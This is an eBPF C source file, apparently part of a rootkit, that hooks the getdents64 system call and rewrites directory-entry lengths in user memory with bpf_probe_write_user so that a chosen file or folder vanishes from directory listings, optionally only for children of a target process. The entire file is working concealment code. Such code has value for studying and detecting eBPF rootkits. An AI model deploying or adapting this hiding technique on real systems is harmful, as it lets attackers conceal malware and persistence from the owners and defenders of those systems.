#include "common.h"
#include "map.h"


#define PROG_HANDLER 1
#define PROG_PATCHER 2

#define MAX_FILE_LEN 16

// Optional Target Parent PID
const volatile int target_ppid = 0;

// These store the string represenation file (or directory) name
const volatile int file_to_hide_len = 0;
const volatile u8 file_to_hide[MAX_FILE_LEN];


int handle_getdents_exit(struct trace_event_raw_sys_exit *);
int handle_getdents_patch(struct trace_event_raw_sys_exit *);

// Map to hold program tail calls
struct {
   __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
   __uint(key_size, sizeof(u32));
   __uint(value_size, sizeof(u32));
   __uint(max_entries, 1024);
   __array(values, int (void *));
} map_prog_array SEC(".maps") = {
    .values = {
        [PROG_HANDLER] = (void *)&handle_getdents_exit,
        [PROG_PATCHER] = (void *)&handle_getdents_patch,
    },
};


SEC("tracepoint/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();

    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }

    // struct linux_dirent64 {
    //     u64        d_ino;    /* 64-bit inode number */
    //     u64        d_off;    /* 64-bit offset to next structure */
    //     unsigned short d_reclen; /* Size of this dirent */
    //     unsigned char  d_type;   /* File type */
    //     char           d_name[]; /* Filename (null-terminated) */ };
    // int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

    int pid = pid_tgid >> 32;
    unsigned int fd = ctx->args[0];
    unsigned int buff_count = ctx->args[2];

    // Store dirp params in map for exit function
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);

    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int total_bytes_read = ctx->ret;
    // if bytes_read is 0, everything's been read
    if (total_bytes_read <= 0) {
        return 0;
    }

    // Check we stored the address of the buffer from the syscall entry
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }


    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    int pid = pid_tgid >> 32;
    short unsigned int d_reclen = 0;
    char filename[MAX_FILE_LEN];

    unsigned int bpos = 0;
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if (pBPOS != 0) {
        bpos = *pBPOS;
    }

    // We Calling 'handle_getdents_exit' in a loop to iterate over the file listing.
    // Due to the limitation of eBPF. We split it into a chunk of 128 and use 'bpf_tail_call'
    // with bpos to create a infinite loop.
    // When we find target file, jump to handle_getdents_patch to do the actual patching.
    for (int i = 0; i < 128; i ++) {
        if (bpos >= total_bytes_read) {
            break;
        }
        dirp = (struct linux_dirent64 *)(buff_addr+bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        bpf_probe_read_user_str(&filename, sizeof(filename), dirp->d_name);

#ifdef DEBUG

bpf_printk("[CLOAK] read filename %s\n", filename);
bpf_printk("[CLOAK] input pid %s\n", file_to_hide);
#endif


        int j = 0;
        for (j = 0; j < file_to_hide_len; j++) {
            if (filename[j] != file_to_hide[j]) {
                break;
            }
        }

        if (j == file_to_hide_len) {

#ifdef DEBUG
bpf_printk("[CLOAK] We've found the target folder!!!");
#endif

            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            bpf_map_delete_elem(&map_buffs, &pid_tgid);

            //Notice that when we jump, dirp in the map is the pervious one.
            bpf_tail_call(ctx, &map_prog_array, PROG_PATCHER);
        }
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    if (bpos < total_bytes_read) {
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &map_prog_array, PROG_HANDLER);
    }

    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);

    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
{

    // Only patch if we've already checked and found our pid's folder to hide
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

// #ifdef DEBUG

// bpf_printk("[CLOAK] start patching %ld",*pbuff_addr);
// // bpf_printk("[CLOAK] input pid %s\n", file_to_hide);
// #endif
    unsigned long buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;

    unsigned short d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr+d_reclen_previous);
    unsigned short d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);


    char filename[MAX_FILE_LEN];
    bpf_probe_read_user_str(&filename, file_to_hide_len+1, dirp->d_name);

#ifdef DEBUG
bpf_printk("[CLOAK] filename %s\n", filename);
#endif

    int j = 0;
    for (j = 0; j < file_to_hide_len; j++) {
        if (filename[j] != file_to_hide[j]) {
            bpf_map_delete_elem(&map_to_patch, &pid_tgid);
            return 0;
        }
    }

#ifdef DEBUG
    bpf_probe_read_user_str(&filename, file_to_hide_len+1, dirp_previous->d_name);
    filename[file_to_hide_len] = 0x00;
    bpf_printk("[CLOAK] filename previous %s\n", filename);
    bpf_probe_read_user_str(&filename, file_to_hide_len+1, dirp->d_name);
    filename[file_to_hide_len] = 0x00;
    bpf_printk("[CLOAK] filename next one %s\n", filename);
#endif



    // setting the d_reclen of previous linux_dirent64 struct,
    // to cover itself and our target
    // This will make the program skip over our folder.
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

    // Send an event to user program
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = (pid_tgid >> 32);
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }

    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
    return 0;
}
